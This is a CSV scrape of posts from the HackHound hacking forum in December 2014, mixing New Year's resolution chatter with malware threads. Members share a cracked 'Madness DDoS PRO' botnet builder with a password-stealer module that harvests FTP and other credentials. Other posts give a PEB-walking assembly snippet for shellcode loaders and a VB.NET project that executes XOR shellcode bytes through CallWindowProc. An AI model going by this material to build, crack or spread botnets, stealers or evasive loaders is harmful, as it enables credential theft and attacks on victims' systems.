subforum,threadTitle,authorName,postdatetime,flatcontent,userTitle
Madness DDoS PRO 1.31 (password module incl.) [Cracked by 0x22] - Malware Samples - HackHound,madness-ddos-pro-131-password-module-incl-cracked-by-0x22,dchamal,12/28/2014 0:00,"Ok I blindly tried to patch some potential checks inside the Password Stealer Module, wich is a 1MB Delphi Monster... There are two Versions, tell me if one of them worked. If not, the Stealer module wasn't worth it anyways. You have a dl & exec command. Even the bot does nothing else than dl,rename and execute. Testing it now, I ll update soon",Beginner
[Resolved] Rooting a Concord 2 from linux? - Mobile - HackHound,resolved-rooting-a-concord-2-from-linux,Dysfunctional,12/29/2014 0:00,easy peasy it's 4.3 version but I got it thanks for the help,Beginner
Madness DDoS PRO 1.31 (password module incl.) [Cracked by 0x22] - Malware Samples - HackHound,madness-ddos-pro-131-password-module-incl-cracked-by-0x22,dchamal,12/29/2014 0:00,"yea, pwd grabber is not working . Actually it s a pretty neat feature and the pwd grabber works really well, it gets a lot of ftps among other pwds, and it's all in plain text.",Beginner
[FASM] x86 LoadPE shellcode with plugin support - Resources - HackHound,fasm-x86-loadpe-shellcode-with-plugin-support,Jochen,12/29/2014 0:00,"What's wrong with getting KernelBase like this , if you gonna use the PEB. proc GetKernel32 MOV EAX, [FS:30h] MOV EAX, [EAX+0Ch] MOV EAX, [EAX+0Ch] MOV EAX, [EAX] MOV EAX, [EAX] MOV EAX, [EAX+18h] RET endp",Member
[FASM] x86 LoadPE shellcode with plugin support - Resources - HackHound,fasm-x86-loadpe-shellcode-with-plugin-support,Tigerass,12/29/2014 0:00,"@Jochen because you are getting it ""by luck"". Most of the time it will go well, but the order of the loaded modules isnt fixed. So some av for eg. Could change it.",Newbie
Madness DDoS PRO 1.31 (password module incl.) [Cracked by 0x22] - Malware Samples - HackHound,madness-ddos-pro-131-password-module-incl-cracked-by-0x22,fatar,12/29/2014 0:00,--------------------------- madnesscracked.exe - Application Error --------------------------- The instruction at 0x91c5b800 referenced memory at 0x91c5b800. The memory could not be read. Click on OK to terminate the program --------------------------- OK,Newbie
Madness DDoS PRO 1.31 (password module incl.) [Cracked by 0x22] - Malware Samples - HackHound,madness-ddos-pro-131-password-module-incl-cracked-by-0x22,0x22,12/29/2014 0:00,Works fine here. Ill test later tonight. This bilder is not update cuz i cant edit my post,Advanced
Phase Botnet sample + Panel Files - File analysis - HackHound,phase-botnet-sample-panel-files,V!RUs HeLL,12/29/2014 0:00,Kernelmode is one of the less good forums. Sadly they dont accept my email. Can you just do that? i mean your avater.,Beginner
Phase Botnet sample + Panel Files - File analysis - HackHound,phase-botnet-sample-panel-files,Tigerass,12/29/2014 0:00,"Edited by Tigerass, 29 December 2014 - 11:23 PM.",Member
New Year&#39;s resolutions - General Discussion - HackHound,new-years-resolutions,duyan13,12/29/2014 0:00,"Hey, So as some of you guys may have notice, it's just some days far until year 2015 starts. That also means settings new aims and trying to accomplish it. Alright, so this topic is about: What are your aims for 2015 ? My aims are quite straightforward: - School - Continue expanding my knowledge in : C++, Unix-Systems (Linux), Web Development (Server-sided with Node.js and other things), Game Development with Unity, moar upcoming big open source projects,... - If have some spare time, some Windows R.E. - Move to some Unix-System And Yes, I do also have real life aims lol, but I kinda think these are more private . Edited by duyan13, 29 December 2014 - 04:36 PM.",IntermediateMember
Madness DDoS PRO 1.31 (password module incl.) [Cracked by 0x22] - Malware Samples - HackHound,madness-ddos-pro-131-password-module-incl-cracked-by-0x22,0x22,12/29/2014 0:00,"Sorry about that, it seems that the previous link i provided for my builder was non functional because some changes i made in the code, fixed it now, new download link is https://mega.co.nz/#...Aza9S1m8HxvPaqQ I cannot update the main thread so unless x58 sees this it gotta stay here Thanks for the info! Edited by 0x22, 29 December 2014 - 04:44 PM.",Advanced
New Year&#39;s resolutions - General Discussion - HackHound,new-years-resolutions,Pongi,12/29/2014 0:00,"IT-Related -become the best ratt3r on ****. lol jk... - Looking into the C++ QT lib - Digging deeper into Web Dev, especially dynamic integration of php, ajax and stuff like that. - Unpack, Cr3ck and finally release more **** shitware Reallife - Keeping my mood stable, keep being focused (study related) - Finishing Master Thesis - Loose my virginity lmao",Member
New Year&#39;s resolutions - General Discussion - HackHound,new-years-resolutions,x58,12/29/2014 0:00,For me it's kinda straightforward too.. Learn and study .. Work Eat Sleep Repeat,Advanced
New Year&#39;s resolutions - General Discussion - HackHound,new-years-resolutions,Dysfunctional,12/29/2014 0:00,Learn everything in this field i can focusing especially on mastering my linux Pass certification exams Get off medication that dumbs me down Not ever go back to giving up on life Learn some more,Beginner
New Year&#39;s resolutions - General Discussion - HackHound,new-years-resolutions,Cryptotoad,12/30/2014 0:00,My new years resolution is to overcome my depression and double my income.,IntermediateMember
New Year&#39;s resolutions - General Discussion - HackHound,new-years-resolutions,Tigerass,12/30/2014 0:00,- Dont fail this semester - Pick another wg / flat - 20 pull-ups / 1 armed ones - Release some apps - Build something flying / diving with ųc's - Learn basic Russian - drink one kasten oettinger alone. (Current record 14/20 ) - Bank balance over 10k Pret,Newbie
Phase Botnet sample + Panel Files - File analysis - HackHound,phase-botnet-sample-panel-files,V!RUs HeLL,12/30/2014 0:00,,Beginner
New Year&#39;s resolutions - General Discussion - HackHound,new-years-resolutions,testacc,12/30/2014 0:00,- Finish decoration - Get a job - Something else probably... Get body fat % to ~10-15. / 1 armed ones That's a nice challenge. Not so easy as some people might think.,IntermediateMember
New Year&#39;s resolutions - General Discussion - HackHound,new-years-resolutions,Becks,12/30/2014 0:00,For me it's kinda straightforward too.. Learn and study .. Work Eat Sleep Repeat ^This,IntermediateMember
New Year&#39;s resolutions - General Discussion - HackHound,new-years-resolutions,x58,12/30/2014 0:00,^This Yours look the same or wut?,Advanced
[HELP]Simple EncryptString XOR shellcode into vb.net - Resources - HackHound,helpsimple-encryptstring-xor-shellcode-into-vbnet,mosbecchi,12/30/2014 0:00,"hello, I can not fix this simple project because I have problems with the replacement of StrPtr Can anyone explain how to fix? frmMain Public Class frmMain Private Sub btnEnc_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnEnc.Click 'encrypt Dim chiave As String = ""aonyregpnxmtxppm"" txtEnc.Text = mXOR.ASMXORString(txtClear.Text, chiave) End Sub Private Sub btnDec_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnDec.Click 'decrypt Dim chiave As String = ""aonyregpnxmtxppm"" txtDec.Text = mXOR.ASMXORString(txtEnc.Text, chiave) End Sub End Class mXOR Imports System.Runtime.InteropServices Imports System.Text Module mXOR Private Declare Function CallWindowProc Lib ""user32"" Alias ""CallWindowProcW"" (ByVal ptrMC As Long, ByVal P1 As Long, ByVal P2 As Long, ByVal P3 As Long, ByVal P4 As Long) As Long Private MyByteXor(93) As Byte ' Byte array (hold the ASM ShellCode) Private ptrMC As Long 'Byte array Pointer Store Value Public Function ASMXORString(ByVal Str As String, ByVal Password As String) As String Call LeggiCodiceMasm32() Call CallWindowProc(ptrMC, Marshal.PtrToStringAuto(Str), Len(Str), Marshal.PtrToStringAuto(Password), Len(Password)) ASMXORString = Str End Function Public Sub ASMXORByte(ByVal ByteA() As Byte, ByVal Password As String) Call LeggiCodiceMasm32() Call CallWindowProc(ptrMC, VarPtr(ByteA(0)), UBound(ByteA), Marshal.PtrToStringAuto(Password), Len(Password)) End Sub Sub LeggiCodiceMasm32() MyByteXor(0) = 85 MyByteXor(1) = 137 MyByteXor(2) = 229 MyByteXor(3) = 83 MyByteXor(4) = 86 MyByteXor(5) = 87 MyByteXor(6) = 139 MyByteXor(7) = 69 MyByteXor(8) = 12 MyByteXor(9) = 133 MyByteXor(10) = 192 MyByteXor(11) = 116 MyByteXor(12) = 70 MyByteXor(13) = 139 MyByteXor(14) = 69 MyByteXor(15) = 20 MyByteXor(16) = 133 MyByteXor(17) = 192 MyByteXor(18) = 116 MyByteXor(19) = 63 MyByteXor(20) = 139 MyByteXor(21) = 77 MyByteXor(22) = 12 MyByteXor(23) = 209 MyByteXor(24) = 225 MyByteXor(25) = 139 MyByteXor(26) = 85 MyByteXor(27) = 8 MyByteXor(28) = 1 MyByteXor(29) = 202 MyByteXor(30) = 247 MyByteXor(31) = 217 MyByteXor(32) = 139 MyByteXor(33) = 93 MyByteXor(34) = 20 MyByteXor(35) = 209 MyByteXor(36) = 227 MyByteXor(37) = 139 MyByteXor(38) = 69 MyByteXor(39) = 16 MyByteXor(40) = 1 MyByteXor(41) = 216 MyByteXor(42) = 137 MyByteXor(43) = 69 MyByteXor(44) = 16 MyByteXor(45) = 247 MyByteXor(46) = 219 MyByteXor(47) = 137 MyByteXor(48) = 93 MyByteXor(49) = 20 MyByteXor(50) = 139 MyByteXor(51) = 4 MyByteXor(52) = 10 MyByteXor(53) = 3 MyByteXor(54) = 93 MyByteXor(55) = 16 MyByteXor(56) = 50 MyByteXor(57) = 3 MyByteXor(58) = 43 MyByteXor(59) = 93 MyByteXor(60) = 16 MyByteXor(61) = 129 MyByteXor(62) = 195 MyByteXor(63) = 2 MyByteXor(64) = 0 MyByteXor(65) = 0 MyByteXor(66) = 0 MyByteXor(67) = 117 MyByteXor(68) = 3 MyByteXor(69) = 139 MyByteXor(70) = 93 MyByteXor(71) = 20 MyByteXor(72) = 137 MyByteXor(73) = 4 MyByteXor(74) = 10 MyByteXor(75) = 129 MyByteXor(76) = 193 MyByteXor(77) = 2 MyByteXor(78) = 0 MyByteXor(79) = 0 MyByteXor(80) = 0 MyByteXor(81) = 117 MyByteXor(82) = 223 MyByteXor(83) = 49 MyByteXor(84) = 192 MyByteXor(85) = 95 MyByteXor(86) = 94 MyByteXor(87) = 91 MyByteXor(88) = 137 MyByteXor(89) = 236 MyByteXor(90) = 93 MyByteXor(91) = 194 MyByteXor(92) = 16 MyByteXor(93) = 0 ptrMC = VarPtr(MyByteXor(0)) End Sub ' a delegate that can point to the VarPtrCallback method Private Delegate Function VarPtrCallbackDelegate( _ ByVal address As Integer, ByVal unused1 As Integer, _ ByVal unused2 As Integer, ByVal unused3 As Integer) As Integer ' two aliases for the CallWindowProcA Windows API method ' notice that 2nd argument is passed by-reference Private Declare Function CallWindowProc Lib ""user32"" _ Alias ""CallWindowProcA"" _ (ByVal wndProc As VarPtrCallbackDelegate, ByRef var As Short, _ ByVal unused1 As Integer, ByVal unused2 As Integer, _ ByVal unused3 As Integer) As Integer Private Declare Function CallWindowProc Lib ""user32"" _ Alias ""CallWindowProcA"" _ (ByVal wndProc As VarPtrCallbackDelegate, ByRef var As Integer, _ ByVal unused1 As Integer, ByVal unused2 As Integer, _ ByVal unused3 As Integer) As Integer ' ...add more overload to support other data types... ' the method that is indirectly executed when calling CallVarPtrSupport ' notice that 1st argument is declared by-value (this is the ' argument that receives the 2nd value passed to CallVarPtrSupport) Private Function VarPtrCallback(ByVal address As Integer, _ ByVal unused1 As Integer, ByVal unused2 As Integer, _ ByVal unused3 As Integer) As Integer Return address End Function ' two overloads of VarPtr Public Function VarPtr(ByRef var As Short) As Integer Return CallWindowProc(AddressOf VarPtrCallback, var, 0, 0, 0) End Function End Module thanks in advance",Beginner
New Year&#39;s resolutions - General Discussion - HackHound,new-years-resolutions,Becks,12/30/2014 0:00,Yours look the same or wut? Jup they're exactly the same bro,IntermediateMember
